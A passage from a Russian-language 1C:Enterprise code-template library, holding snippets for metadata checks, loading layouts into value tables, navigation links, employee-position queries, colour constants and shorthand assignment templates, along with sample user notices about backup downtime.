				ЕстьМетаданные = ?(ЕстьИмяРеквизита, ОбъектТЧ.Реквизиты.Найти(ИмяРеквизита) <> Неопределено, ТЧЕстьМетаданные);
			КонецЕсли; 
		КонецЕсли; 
	КонецЕсли; 
	
	ТочноЕстьМетаданные = ЕстьМетаданные <> Неопределено;
	Если ТочноЕстьМетаданные И ЕстьМетаданные Тогда
		Если ЭтоРеквизит Тогда
			Значение = ОбъектПроверки[ИмяРеквизита];
		Иначе // Это ТЧ	
			Если ЕстьИмяТабличнойЧасти Тогда
				//Если ЕстьИмяРеквизита Тогда // Это надо отладить
				//	ЕстьСтрокиТЧ = ОбъектПроверки[ИмяТабличнойЧасти].Количество() > 0;
				//	Если ЕстьСтрокиТЧ И НомерСтрокиТЧ > 0 Тогда
				//		Значение = ОбъектПроверки[ИмяТабличнойЧасти][НомерСтрокиТЧ][ИмяРеквизита];	
				//	КонецЕсли; 
				//КонецЕсли; 
				//Значение = ?(ЕстьИмяРеквизита, ОбъектПроверки[ИмяТабличнойЧасти][ИмяРеквизита], ОбъектПроверки[ИмяТабличнойЧасти]); // Не прокатит, т.к. надо задавать номер строки, реквизит которой нужен
				Значение = ОбъектПроверки[ИмяТабличнойЧасти];
			КонецЕсли;	
		КонецЕсли; 
	Иначе
		Значение = ВозвращатьЕслиНетЗначения;
		Если ВыводитьСообщениеОбОшибке Тогда
			Сообщить(""Не было присвоено значение, т.к. не найден нужный реквизит '"" + ИмяРеквизита + ""' в '"" + Строка(ОбъектПроверки) + ""'"");	
		КонецЕсли; 
	КонецЕсли;
	
	Возврат Значение;
	
КонецФункции // ПрисвоитьРеквизитПроверяяМетаданные()
"}
},
{0,
{"ПолучитьМетаданныеОбработки",0,0,"","&НаСервере
Функция ПолучитьМетаданныеОбработки(пСвойство = """")
	
	ОбъектЗначение 			= РеквизитФормыВЗначение(""Объект"");
	ЭтотОбъектМетаданные 	= ОбъектЗначение.Метаданные();
	
	Если ПустаяСтрока(пСвойство) Тогда
		Результат = ЭтотОбъектМетаданные;
	Иначе
		Результат = ЭтотОбъектМетаданные[пСвойство];
	КонецЕсли; 
	
	Возврат Результат;
	
КонецФункции // ПолучитьНаименованиеОбработки()"}
},
{0,
{"ЕстьРеквизитОбъекта - Есть ли среди реквизитов объекта реквизит с переданным именем",0,0,"","//Функция позволяет определить есть ли среди реквизитов объекта, реквизит с переданным именем
//-------------------------------------------------------------------------
//Параметры:
//		пОбъект - Именованная структура данных - любой объект имеющий именованные свойства
//		пИмяРек - Строка - Имя искомого реквизита
//		пТипЗначения - Тип Ожидаемый тип реквизита. Если параметр задан, то производится проверка типа
//						имеет смысл, если просто наличие реквизита не может считаться достаточны, и реквизит должен иметь строго определённый тип
//Возвращаемое значение:
//		Булево - Истина если реквизит существует. При проверке типа, Истина вернётся только при совпадении типов
//-------------------------------------------------------------------------
//автор: Майаров Артано 
Функция ЕстьРеквизитОбъекта(пОбъект, пИмяРек, пТипЗначения = Неопределено) Экспорт
	КонтрольноеЗначение = Новый УникальныйИдентификатор;
	СтруктураРеквизита 	= Новый Структура(пИмяРек, КонтрольноеЗначение);
	ПроверятьТип 		= ТипЗнч(пТипЗначения) = Тип(""Тип"");
	
	ЗаполнитьЗначениеСвойств(СтруктураРеквизита, пОбъект);
	Результат 	= Ложь;
	Значение 	= СтруктураРеквизита[пИмяРек];
	Если Значение <> КонтрольноеЗначение Тогда
		Если ПроверятьТип Тогда
			Результат = пТипЗначения = ТипЗнч(Значение);
		Иначе
			Результат = Истина;
		КонецЕсли;
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции"}
},
{6,
{"Найти (проверить)",1,0,"",""},
{0,
{"Найти в Константы",0,0,"","Метаданные.Константы.Найти(""<?""Имя константы"", Константа>"");"}
},
{0,
{"Найти в Документы",0,0,"","Метаданные.Документы.Найти(""<?""Имя документа"", Документ>"");"}
},
{0,
{"Найти в Справочники",0,0,"","Метаданные.Справочники.Найти(""<?""Имя справочника"", Справочник>"");"}
},
{0,
{"Цикл",0,0,"","Для Каждого ИмяКонстанты<?""Элемент"", ВыборВарианта, ""Констранты"", ""Констранты"", ""Документы"", ""Документы"", ""Справочники"", ""Справочники""> Из <?""Элемент"", ВыборВарианта, ""Констранты"", ""Констранты"", ""Документы"", ""Документы"", ""Справочники"", ""Справочники""> Цикл
	Сообщить(Имя<?""Элемент"", ВыборВарианта, ""Констранты"", ""Констранты"", ""Документы"", ""Документы"", ""Справочники"", ""Справочники"">);
КонецЦикла"}
},
{3,
{"Найти реквизит, ТЧ",1,0,"",""},
{0,
{"ЕстьРеквизитОбъекта",0,0,"","&НаСервере
Функция ЕстьРеквизитОбъекта(ИмяРеквизита, Объект) Экспорт
	
	МетаданныеОбъекта 	= Объект.Метаданные();
	Результат 			= МетаданныеОбъекта.Реквизиты.Найти(ИмяРеквизита) <> Неопределено;
	
	Возврат Результат;
	
КонецФункции"}
},
{0,
{"ЕстьТЧОбъекта",0,0,"","&НаСервере
Функция ЕстьТЧОбъекта(ИмяТЧ, Объект) Экспорт
	
	МетаданныеОбъекта 	= Объект.Метаданные();
	Результат 			= МетаданныеОбъекта.ТабличныеЧасти.Найти(ИмяТЧ) <> Неопределено;
	
	Возврат Результат;
	
КонецФункции
"}
},
{0,
{"ПроверитьМетаданные Универсально",0,0,"","//Функция ПроверитьМетаданные
//-------------------------------------------------------------------------
//Параметры:
//		МетаданныеДляПроверки - Строка, Массив - МетаданныеДляПроверки
//		МетаданныеДляПроверки - Объект - Объект
//		ИмяМетаданныхОбъекта - Строка - Напр., ""Реквизиты"", ""ТабличныеЧасти"" 
//Возвращаемое значение:
//		СписокЗначений - Пометка - Пометка отмечена, если есть метаданные
//-------------------------------------------------------------------------
//автор: КучеровРМ 21.09.2018 
&НаСервере
Функция ПроверитьМетаданные(МетаданныеДляПроверки, ОбъектДляПроверки, ИмяМетаданныхОбъекта = ""Реквизиты"", ВернутьТолькоСуществующие = Истина)
	
	ИмяМетаданныхЗнач = СокрЛП(ИмяМетаданныхОбъекта);
	Если ПустаяСтрока(ИмяМетаданныхЗнач) Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	ТипЗнчМетаданныеДляПроверки = ТипЗнч(МетаданныеДляПроверки);
	Если ТипЗнчМетаданныеДляПроверки = Тип(""Строка"") Тогда
		МетаданныеДляПроверкиМассив = СтрРазделить(МетаданныеДляПроверки, "","", Ложь);
	ИначеЕсли ТипЗнчМетаданныеДляПроверки = Тип(""Массив"") Тогда
		МетаданныеДляПроверкиМассив = МетаданныеДляПроверки;
	КонецЕсли;	
	
	МетаданныеДляПроверкиСписок = Новый СписокЗначений;
	МетаданныеДляПроверкиСписок.ЗагрузитьЗначения(МетаданныеДляПроверкиМассив);
	
	МетаданныеОбъекта = ОбъектДляПроверки.Метаданные();
	Для каждого ЭлМетаданныеДляПроверки Из МетаданныеДляПроверкиСписок Цикл
		
		ЭлМетаданныеДляПроверкиЗначение = ЭлМетаданныеДляПроверки.Значение;
		ЭлМетаданныеДляПроверки.Пометка = МетаданныеОбъекта[ИмяМетаданныхОбъекта].Найти(ЭлМетаданныеДляПроверкиЗначение) <> Неопределено; // Значит метаданные найден	
		
		Если ВернутьТолькоСуществующие И НЕ ЭлМетаданныеДляПроверки.Пометка Тогда
			МетаданныеДляПроверкиСписок.Удалить(ЭлМетаданныеДляПроверки);	
		КонецЕсли; 
		
	КонецЦикла;
	
	МетаданныеДляПроверкиСписокКоличество = МетаданныеДляПроверкиСписок.Количество();
	Если МетаданныеДляПроверкиСписокКоличество > 0 Тогда
		Результат = МетаданныеДляПроверкиСписок;
	Иначе
		Результат = Неопределено;
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции // МетаданныеДляПроверки()

// Использование
ЕстьМетаданные = ПроверитьМетаданные(Имя, ОбъектЗначение, ""ТабличныеЧасти"");
Если ЕстьМетаданные <> Неопределено Тогда
	МетаданныеНайти = ""МетаданныеИмя"";
	ЕстьИскомыеМетаданные = ЕстьМетаданные.НайтиПоЗначению(МетаданныеНайти) <> Неопределено;
КонецЕсли;"}
}
},
{0,
{"Относится ли реквизит к расширению",0,0,"","//  Метод определения относится ли реквизит к расширению
Реквизиты = Метаданные.Справочники.Номенклатура.Реквизиты;
Для Каждого Реквизит Из РЕквизиты Цикл
	ЭтоРеквизитРасширения = НЕ Реквизит.РасширениеКонфигурации() = Неопределено;
	Сообщить(Строка(ЭтоРеквизитРасширения) + "" "" + Реквизит.Имя);
КонецЦикла;"}
}
}
},
{6,
{"Использование макета 1С как внутренего справочника",1,0,"",""},
{0,
{"МакетВТаблицуЗначений",0,0,"","//Дешево и сердито, часто нужно считывать данные из макета в таблицу значений (константа типа таблица значений). :) Уж лучше так, чем как это делают 1С-ники в своих регламентированных отчетах. 
//Макет - макет из которого читаем. 
//_ТЗ - если грузим в существующую таблицу (добавляет в конец). 
//флДобавлятьКолонки - если ложь, то новые колонки не добавляются. 
Функция МакетВТаблицуЗначений(Макет, _ТЗ=Неопределено, флДобавлятьКолонки=истина) Экспорт
	Перем ТЗ;
	
	Если _ТЗ=Неопределено Тогда
		ТЗ=Новый ТаблицаЗначений();
		флЗаполняем=ложь;
	Иначе
		ТЗ=_ТЗ;
		флЗаполняем=истина;
	КонецЕсли;
	
	//Считываем колонки
	КоличествоКолонок=0;
	ИменаКолонок=Новый Массив();
	Кол=1;
	Пока истина Цикл
		Адрес=""R1C""+Формат(Кол,""ЧГ="");
		ИмяКол=Макет.Область(Адрес).Текст;
		Если ПустаяСтрока(ИмяКол) Тогда
			Прервать;
		КонецЕсли;
		КоличествоКолонок=КоличествоКолонок+1;
		Если НЕ флЗаполняем или (флЗаполняем И флДобавлятьКолонки) И ТЗ.Колонки.Найти(ИмяКол)=Неопределено Тогда
			ТЗ.Колонки.Добавить(ИмяКол);
		КонецЕсли;
		ИменаКолонок.Добавить(ИмяКол);
		Кол=Кол+1;
	КонецЦикла;
	
	//Считываем строки
	Стр=2; Кол=1;
	Пока истина Цикл
		Вставлено=ложь; Первая=истина;
		Для Инд=1 По КоличествоКолонок Цикл
			Адрес=""R""+Формат(Стр,""ЧГ="")+""C""+Формат(Инд,""ЧГ="");
			Зн=СокрЛП(Макет.Область(Адрес).Текст);
			Если ПустаяСтрока(Зн) Тогда
				Продолжить;
			КонецЕсли;
			Если Первая Тогда
				ТСтр=ТЗ.Добавить();
				Первая=ложь;
				Вставлено=истина;
			КонецЕсли;
			ИмяКолонки=ИменаКолонок[Инд-1];
			Если ТЗ.Колонки.Найти(ИмяКолонки)<>Неопределено Тогда
				Если флЗаполняем Тогда
					//Проверяем тип - число, строка, булево
					ОписаниеТипаКолонки=ТЗ.Колонки[ИмяКолонки].ТипЗначения;
					Если ОписаниеТипаКолонки.СодержитТип(Тип(""Число"")) Тогда
						РезЗн=Число(Зн);
					ИначеЕсли ОписаниеТипаКолонки.СодержитТип(Тип(""Строка"")) Тогда
						РезЗн=Строка(Зн);
					ИначеЕсли ОписаниеТипаКолонки.СодержитТип(Тип(""Булево"")) Тогда
						РезЗн=Булево(Зн);
					ИначеЕсли ОписаниеТипаКолонки.СодержитТип(Тип(""Дата"")) Тогда
						РезЗн=Дата(Зн);
					Иначе
						РезЗн=Зн;
					КонецЕсли;
				Иначе
					РезЗн=Зн;
				КонецЕсли;
				ТСтр[ИмяКолонки]=РезЗн;
			КонецЕсли;
		КонецЦикла;
		Если Не вставлено Тогда
			Прервать;
		КонецЕсли;
		Стр=Стр+1;
		Кол=1;
	КонецЦикла;
	
	Возврат ТЗ;
	
КонецФункции"}
},
{0,
{"Типовой (из УПП)",0,0,"","Функция ПолучитьРеквизитыСчетовУчета(ИмяДокумента, ИмяТабличнойЧасти)
	
	Макет 				= ПолучитьОбщийМакет(""СчетаУчетаВДокументах"");
	ПостроительЗапроса 	= Новый ПостроительЗапроса;
	ОбластьМакета 		= Макет.Область(1, 1, Макет.ВысотаТаблицы,Макет.ШиринаТаблицы); //Макет.Область(""ОписаниеСчетовУчета"")
	ПостроительЗапроса.ИсточникДанных = Новый ОписаниеИсточникаДанных(ОбластьМакета);
	
	// Установим отборы
	УстановитьОтборПоПолю(ПостроительЗапроса, ""Документ"",       ИмяДокумента);
	УстановитьОтборПоПолю(ПостроительЗапроса, ""ТабличнаяЧасть"", ИмяТабличнойЧасти);
	
	// Возвращаем таблицу значений с отобранными из макета данными 
	ПостроительЗапроса.Выполнить();
	Возврат ПостроительЗапроса.Результат.Выгрузить();
	
КонецФункции

// Устанавливает отбор на равенство по полю построителя запроса
//
Процедура УстановитьОтборПоПолю(ПостроительЗапроса, ИмяПоляОтбора, ЗначениеОтбора)
	
	ПолеДокумент 		= ПостроительЗапроса.ДоступныеПоля.Добавить(ИмяПоляОтбора, ИмяПоляОтбора);
	ПолеДокумент.Отбор 	= Истина;
	
	ЭлементОтбора		= ПостроительЗапроса.Отбор.Добавить(ИмяПоляОтбора);
	ЭлементОтбора.Установить(ЗначениеОтбора);
	
КонецПроцедуры
"}
},
{0,
{"Типовой (из УПП) (адаптирован)",0,0,"","Функция ПолучитьТЗИзМакета(пИмяМакета = """", пИмяОбласти = """", пОбщийМакет = Ложь, пСтруктураОтбора = Неопределено)
	
	Если пОбщийМакет Тогда
		Макет 	= ПолучитьОбщийМакет(пИмяМакета);
	Иначе
		Макет 	= ПолучитьМакет(пИмяМакета);
	КонецЕсли; 
	
	ПостроительЗапроса 	= Новый ПостроительЗапроса;
	
	Если НЕ ПустаяСтрока(пИмяОбласти) Тогда			   
		ОбластьМакета 	= Макет.Область(пИмяОбласти)
	Иначе
		ОбластьМакета 	= Макет.Область(1, 1, Макет.ВысотаТаблицы, Макет.ШиринаТаблицы);
	КонецЕсли; 
	
	ПостроительЗапроса.ИсточникДанных = Новый ОписаниеИсточникаДанных(ОбластьМакета);
	
	// Установим отборы
	Если пСтруктураОтбора <> Неопределено И ТипЗнч(пСтруктураОтбора) = Тип(""Структура"") Тогда
		Для каждого пСтруктураОтбораЭлем Из пСтруктураОтбора Цикл
			
			//УстановитьОтборПоПолю(ПостроительЗапроса,  пСтруктураОтбораЭлем.Ключ, пСтруктураОтбораЭлем.Значение); //Если через отдельную функцию
			ИмяПоляОтбора 		= пСтруктураОтбораЭлем.Ключ;
			ЗначениеОтбора 		= пСтруктураОтбораЭлем.Значение;
			
			ПолеДокумент 		= ПостроительЗапроса.ДоступныеПоля.Добавить(ИмяПоляОтбора, ИмяПоляОтбора);
			ПолеДокумент.Отбор 	= Истина;
			
			ЭлементОтбора		= ПостроительЗапроса.Отбор.Добавить(ИмяПоляОтбора);
			ЭлементОтбора.Установить(ЗначениеОтбора);
			
		КонецЦикла; 
	КонецЕсли; 
	
	// Возвращаем таблицу значений с отобранными из макета данными 
	ПостроительЗапроса.Выполнить();
	Возврат ПостроительЗапроса.Результат.Выгрузить();
	
КонецФункции

// Устанавливает отбор на равенство по полю построителя запроса
//
Процедура УстановитьОтборПоПолю(ПостроительЗапроса, ИмяПоляОтбора, ЗначениеОтбора)
	
	ПолеДокумент 		= ПостроительЗапроса.ДоступныеПоля.Добавить(ИмяПоляОтбора, ИмяПоляОтбора);
	ПолеДокумент.Отбор 	= Истина;
	
	ЭлементОтбора		= ПостроительЗапроса.Отбор.Добавить(ИмяПоляОтбора);
	ЭлементОтбора.Установить(ЗначениеОтбора);
	
КонецПроцедуры
"}
},
{0,
{"Чтение в список значений",0,0,"","//Чтение в список значений (Должности). Данные находятся в первой колонке.
Должности.Очистить();
МакетДолжности = ПолучитьМакет(""Должности"");
Стр = 1;
Пока истина Цикл
	Адрес=""R""+Формат(Стр,""ЧГ="")+""C1"";
	Значение=МакетДолжности.Область(Адрес).Текст;
	Если ПустаяСтрока(Значение) Тогда
		Прервать;
	КонецЕсли;      
	Должности.Добавить(Значение);
	Стр = Стр + 1;
КонецЦикла; "}
},
{0,
{"Загружает весь табличный документ в таблицу значений > Автор : dimoff",0,0,"","// Вариант 1
// По переданному табличному документу возвращает таблицу значений,

// при условии что в первой строке таблицы - идентификаторы колонок 
// Автор : dimoff
Функция ПолучитьТЗИзМакета(ТабДок, КолонкаИндекса = 1) Экспорт
	
	ТаблицаДанных = Новый ТаблицаЗначений;
	НомерКолонки = 0;
	Пока Истина Цикл
		НомерКолонки = НомерКолонки + 1;
		ИмяКолонки = ТабДок.Область(1, НомерКолонки).Текст;
		Если ПустаяСтрока(ИмяКолонки) Тогда
			Прервать;
		КонецЕсли; 
		ТаблицаДанных.Колонки.Добавить(ИмяКолонки);
	КонецЦикла;
	
	СчетчикКолонок = НомерКолонки - 1;
	
	НомерСтроки = 1; ФлагПрерывания = Ложь;
	Пока Истина Цикл
		НомерСтроки = НомерСтроки + 1;
		Стр = ТаблицаДанных.Добавить();
		
		Для А = 1 ПО СчетчикКолонок Цикл
			ТекстКолонки = ТабДок.Область(НомерСтроки, А).Текст;
			Если ПустаяСтрока(ТекстКолонки) Тогда
				Если А = КолонкаИндекса Тогда
					Флагпрерывания = Истина;
					ТаблицаДанных.Удалить(Стр);
				КонецЕсли;
			Иначе
				Стр[А - 1] = ТекстКолонки
			КонецЕсли;
			
			Если Флагпрерывания Тогда
				Прервать
			КонецЕсли;
		КонецЦикла;
		
		Если Флагпрерывания Тогда
			Прервать
		КонецЕсли;
	КонецЦикла;
	
	Возврат ТаблицаДанных
КонецФункции

"}
},
{0,
{"Загружает весь табличный документ в таблицу значений > Автор : Гений1С",0,0,"","//Код 1C v 8.х
// Варинат 2
//Функция загружает весь макет, табличный документ в таблицу значений
//Первая строка содержит подписи колонок (должны быть правильные идентификаторы)
//Пустые строки (состоящией из пробелов, переводов строки и т.п.) заменяет на Неопределено
//Если в ячейке есть значение, в ячейку таблицы значений попадает именно это значение
//Автор : Гений1С
Функция обМакетВТаблицуЗначений(Макет) Экспорт
	Перем ТЗ;
	ТЗ=Новый ТаблицаЗначений();
	#Если Клиент Тогда
		//Считываем колонки
		Для Стр=1 По Макет.ВысотаТаблицы Цикл
			Если Стр>1 Тогда
				ТекСтр=ТЗ.Добавить();
			КонецЕсли;
			ПустаяСтрока=истина;
			Для Кол=1 По Макет.ШиринаТаблицы Цикл
				Яч=Макет.Область(Стр, Кол);
				Если Яч.СодержитЗначение Тогда
					Зн=Яч.Значение;
				Иначе
					Зн=Яч.Текст;
				КонецЕсли;
				Если ТипЗнч(Зн)=Тип(""Строка"") И ПустаяСтрока(Зн) Тогда
					Зн=Неопределено;
				КонецЕсли;
				
				//Добавляем колонку
				Если Стр=1 Тогда
					ТЗ.Колонки.Добавить(Зн);
				Иначе
					ТекСтр[Кол-1]=Зн;
				КонецЕсли;
			КонецЦикла;
		КонецЦикла;
	#КонецЕсли
	Возврат ТЗ;
КонецФункции "}
}
},
{7,
{"Внешняя навигационная ссылка",1,0,"",""},
{0,
{"Типовое",0,0,"","ОбщегоНазначения.АдресПубликацииИнформационнойБазыВЛокальнойСети() + ""/#"" + ПолучитьНавигационнуюСсылку(Документ)"}
},
{0,
{"ПолучитьНавигационнуюСсылкуИнформационнойБазы",0,0,"ПНСИБ","ПолучитьНавигационнуюСсылкуИнформационнойБазы();"}
},
{0,
{"ПолучитьПолнуюНавигационнуюСсылку",0,0,"","&НаСервере
Функция ПолучитьПолнуюНавигационнуюСсылку(Ссылка, УчестьИнформационнуюБазу = Ложь)
	
	СсылкуИнформационнойБазы = """";
	Если УчестьИнформационнуюБазу Тогда
		СсылкуИнформационнойБазы = СсылкуИнформационнойБазы + ПолучитьНавигационнуюСсылкуИнформационнойБазы() + ""/#"";
	КонецЕсли;
	
	НавигационнаяСсылка = """";
	Если Метаданные.Константы.Найти(""АдресВебСервера"") <> Неопределено Тогда
		
		Если ЗначениеЗаполнено(Константы.АдресВебСервера.Получить()) Тогда 
			НавигационнаяСсылка = СокрЛП(Константы.АдресВебСервера.Получить()) + ""/#"" + ПолучитьНавигационнуюСсылку(Ссылка); 
		Иначе 
			НавигационнаяСсылка = СсылкуИнформационнойБазы + ПолучитьНавигационнуюСсылку(Ссылка); 
		КонецЕсли;
	Иначе
		НавигационнаяСсылка = СсылкуИнформационнойБазы + ПолучитьНавигационнуюСсылку(Ссылка); 
	КонецЕсли;
	
	Возврат НавигационнаяСсылка;
	
КонецФункции // ПолучитьПолнуюНавигационнуюСсылку()
 
"}
},
{0,
{"При использовании в web-клиенте",0,0,"","//При использовании в web-клиенте 
//Стояла следующая задача: отправлять уведомления о изменениях в документах на почту и вкладывать в письмо гиперссылку на измененный документ. База опубликована на web-севере. Полученная в 1С ссылка методом ПолучитьНавигационнуюСсылку() имела следующий вид 
//https://localhost/#e1cib/data/Документы.Счет?ref=""ab99005056c0000811e00f627bcddd55"" 

//Вложенная в таком виде ссылка не открывала нужный документ, а лишь инициировала переход в базу. 
//Как оказалось проблема была в следующем, в URL-адресах не должны присутствовать кавычки, их заменяем на %22 
//https://localhost/#e1cib/data/Документы.Счет?ref=%22ab99005056c0000811e00f627bcddd55%22"}
},
{0,
{"ПолучитьНавигационнуюСсылку",0,0,"ПНС","ПолучитьНавигационнуюСсылку();"}
},
{0,
{"СозданоИзДокумента",0,0,"","// Описание, Комментарий
СозданоИзДокумента 	= """";
Если ЗначениеЗаполнено(ЭлементСсылка) Тогда
	НавигационнаяСсылка = ПолучитьПолнуюНавигационнуюСсылку(ЭлементСсылка);
	СозданоИзДокумента 	= ""Создано из документа: "" 	+ Строка(ЭлементСсылка) + ""
	|Ссылка на документ: "" + НавигационнаяСсылка + ""
	|
	|"";
КонецЕсли; 
ОписаниеЗадания 			= СозданоИзДокумента + ""Описание:"" + Символы.ПС;

// Не получается так: ПолучитьПолнуюНавигационнуюСсылку + Символы.ПС"}
},
{0,
{"ПолучитьСсылкуИзНавигационной",0,0,"","Функция ПолучитьСсылкуИзНавигационной(НС)
    
    ПерваяТочка 	= Найти(НС, ""e1cib/data/"");
    ВтораяТочка 	= Найти(НС, ""?ref="");
    
    ПредставлениеТипа   = Сред(НС, ПерваяТочка + 11, ВтораяТочка - ПерваяТочка - 11);
    ШаблонЗначения 	= ЗначениеВСтрокуВнутр(ПредопределенноеЗначение(ПредставлениеТипа + "".ПустаяСсылка""));
    ЗначениеСсылки 	= СтрЗаменить(ШаблонЗначения, ""00000000000000000000000000000000"", Сред(НС, ВтораяТочка + 5));
    Ссылка 			= ЗначениеИзСтрокиВнутр(ЗначениеСсылки);
	
	Возврат Ссылка;
	
КонецФункции"}
}
},
{1,
{"Сообщения для пользователей",1,0,"",""},
{0,
{"Блокировка пользователей",0,0,"","Будет производиться резервная копия программы. Процесс займёт 1-3 часа, в зависимости от размера базы. 
Будет производиться резервная копия программы (1-3 часа, в зависимости от размера базы) и приминение изменений (1-2 часа). Всего процесс займёт 2-5 часов.

Будет производиться резервная копия программы (1-3 часа, в зависимости от размера базы) и интеграция модуля Битрикс (1-2 часа). Всего процесс займёт 2-5 часов.

Прошу предоставить доступ в 1С в рамках задачи устранения проблем с синхронизацией с Битрикс. 
Прошу предоставить доступ в 1С в рамках задачи настройки синхронизации с Битрикс.

Доп параметр запуска 1С: /UC123"}
}
},
{2,
{"Должность сотрудника",1,0,"",""},
{0,
{"ПолучитьДолжностьСотрудника",0,0,"","Функция ПолучитьДолжностьСотрудника(Сотрудник)
	
	ЗапросПоСотрудникам = Новый Запрос;
	ЗапросПоСотрудникам.Текст = ""ВЫБРАТЬ ТекущиеКадровыеДанныеСотрудников.ТекущаяДолжность
	|ИЗ РегистрСведений.ТекущиеКадровыеДанныеСотрудников КАК ТекущиеКадровыеДанныеСотрудников
	|ГДЕ ТекущиеКадровыеДанныеСотрудников.Сотрудник = &Сотрудник"";
	
	ЗапросПоСотрудникам.Параметры.Вставить(""Сотрудник"", Сотрудник);
	
	Результат = ЗапросПоСотрудникам.Выполнить(); 
	Если Не Результат.Пустой() Тогда
		Выборка = Результат.Выбрать();
		Выборка.Следующий();
		Возврат Выборка.ТекущаяДолжность;
	Иначе
		Возврат Неопределено
	КонецЕсли;    
	
КонецФункции"}
},
{0,
{"ДолжностьСотрудника Типовое",0,0,"","&НаСервереБезКонтекста
Функция ДолжностьСотрудника(Сотрудник)
	
	МассивСотрудников = Новый Массив;
	МассивСотрудников.Добавить(Сотрудник);
	ТЗСведения = КадровыйУчет.КадровыеДанныеСотрудников(Истина, МассивСотрудников, ""Организация,Должность"");
	Если ТЗСведения.Количество() > 0 Тогда
		Должность = ТЗСведения[0].Должность;
	Иначе
		Должность = ПредопределенноеЗначение(""Справочник.Должности.ПустаяСсылка"");
	КонецЕсли;
	
	Возврат Должность;
	
КонецФункции"}
}
},
{9,
{"Цвета",1,0,"",""},
{0,
{"WebЦвета",0,0,"ВЦ[вета]","WebЦвета"}
},
{0,
{"WebЦвета.СветлоКоралловый",0,0,"ВЦК","WebЦвета.СветлоКоралловый"}
},
{0,
{"WebЦвета.БледноЗеленый",0,0,"ВЦЗ","WebЦвета.БледноЗеленый"}
},
{0,
{"WebЦвета.Лосось",0,0,"ВЦЛ","WebЦвета.Лосось"}
},
{0,
{"WebЦвета.Оранжевый",0,0,"ВЦО","WebЦвета.Оранжевый"}
},
{0,
{"WebЦвета.СветлоНебесноГолубой",0,0,"ВЦГ","WebЦвета.СветлоНебесноГолубой"}
},
{0,
{"WebЦвета.Бирюзовый",0,0,"ВЦБ","WebЦвета.Бирюзовый"}
},
{0,
{"WebЦвета.СеребристоСерый",0,0,"ВЦС","WebЦвета.СеребристоСерый"}
},
{0,
{"WebЦвета.СветлоЗолотистый",0,0,"ВЦЖ","WebЦвета.СветлоЗолотистый"}
}
},
{65,
{"ТОП",1,0,"",""},
{0,
{"Быстрое присваивание левой части правой (для присвоения названия с точками) (==)",0,0,"==","л<?""Введите текст присвоения""> 	= <?""Введите текст присвоения"">;"}
},
{0,
{"Быстрое присваивание левой части правой (для присвоения названия с точками) (2 табуляции == )",0,0,"==	","л<?""Введите текст присвоения""> 		= <?""Введите текст присвоения"">;"}
},
{0,
{"Быстрое присваивание левой части правой (для присвоения названия с точками) (3 табуляции == )",0,0,"==		","л<?""Введите текст присвоения""> 			= <?""Введите текст присвоения"">;"}
},
{0,
{"Быстрое присваивание левой части правой ""Есть"" = ЗначениеЗаполнено",0,0,"==З","лЕсть<?""Введите текст присвоения""> 	= ЗначениеЗаполнено(<?""Введите текст присвоения"">); "}
},
{0,
{"ЗначениеЗаполнено",0,0,"ЗЗ","ЗначениеЗаполнено(<?""Введите какое значение"">)"}
},
{0,
{"= Неопределено",0,0,"=Н","= Неопределено"}
},
{0,
{"= Неопределено;",0,0,"=Н;","= Неопределено;"}
},
{0,
{"<> Неопределено",0,0,"бюН","<> Неопределено"}
},
{0,
{"= Новый Массив",0,0,"=НМ","= Новый Массив"}
},
{0,
{"= Новый Массив и Добавить",0,0,"=НМД","<?""Имя переменной (слитно)""> 	= Новый Массив;
<?""Имя переменной (слитно)"">.Добавить(<?>);"}
},
{0,
{"= Новый Массив;",0,0,"=НМ;","= Новый Массив;"}
},
{0,
{"= Новый Структура",0,0,"=НС","= Новый Структура(""<?>"");"}
},
{0,
{"= Новый Структура Вставить",0,0,"=НСВ","<?""Имя переменной (слитно)""> 	= Новый Структура;
<?""Имя переменной (слитно)"">.Вставить();
"}
},
{0,
{"= Новый Структура;",0,0,"=НС;","= Новый Структура;"}
},
{0,
{"= Истина",0,0,"=И","= Истина"}
},
{0,
{"= Истина;",0,0,"=И;","= Истина;"}
},
{0,
{"= Ложь",0,0,"=Л","= Ложь"}
},
{0,
{"= Ложь;",0,0,"=Л;","= Ложь;"}
},
{0,
{"= Новый СписокЗначений",0,0,"=НСЗ","= Новый СписокЗначений"}
},
{0,
{"= Новый СписокЗначений Добавить",0,0,"=НСЗД","<?""Имя переменной (слитно)""> 	= Новый СписокЗначений;
<?""Имя переменной (слитно)"">.Добавить(<?>);"}
},
{0,
{"= Новый СписокЗначений;",0,0,"=НСЗ;","= Новый СписокЗначений;"}
},
{0,
{"= Новый ТаблицаЗначений",0,0,"=НТЗ","= Новый ТаблицаЗначений"}
},
{0,
{"= Новый ТаблицаЗначений;",0,0,"=НТЗ;","= Новый ТаблицаЗначений;"}
},
{0,
{"= Новый ОписаниеТипов",0,0,"=ОТ","= Новый ОписаниеТипов(""Строка"")"}
},
{0,
{"Если ЗначениеЗаполнено",0,0,"ЕслиЗЗ","Если ЗначениеЗаполнено(<?""Значение на проверку заполненности"">) Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если ЗначениеЗаполнено с локальной переменной",0,0,"ЕслиЛЗЗ","лЕсть<?""Значение на проверку заполненности""> 	= ЗначениеЗаполнено(<?""Значение на проверку заполненности"">);
Если лЕсть<?""Значение на проверку заполненности""> Тогда
	<?>
КонецЕсли;"}
},
{0,
{"ЕслиПС",0,0,"ЕслиПС[трока]","Если ПустаяСтрока(<?""Имя переменной со строкой"">) Тогда			   
	<?>
КонецЕсли;"}
},
{0,
{"ЕслиПС с локальной переменной",0,0,"ЕслиЛПС[трока]","лПустаяСтрока<?""Имя переменной со строкой""> 	= ПустаяСтрока(<?""Имя переменной со строкой"">)
Если лПустаяСтрока<?""Имя переменной со строкой""> Тогда			   
	<?>
КонецЕсли;"}
},
{0,
{"Если ТипЗнч",0,0,"ЕслиТ[ипЗнч]","Если ТипЗнч(<?""Переменная для проверки"">) = Тип(""Строка"") Тогда
	<?>
ИначеЕсли ТипЗнч(<?""Переменная для проверки"">) = Тип(""Массив"") Тогда
	
ИначеЕсли ТипЗнч(<?""Переменная для проверки"">) = Тип(""ДокументСсылка.РеализацияТоваров"") Тогда
	
КонецЕсли;"}
},
{0,
{"Если ТипЗнч с локальной переменной",0,0,"ЕслиЛТ[ипЗнч]","лТипЗнч<?""Переменная для проверки""> = ТипЗнч(<?""Переменная для проверки"">);
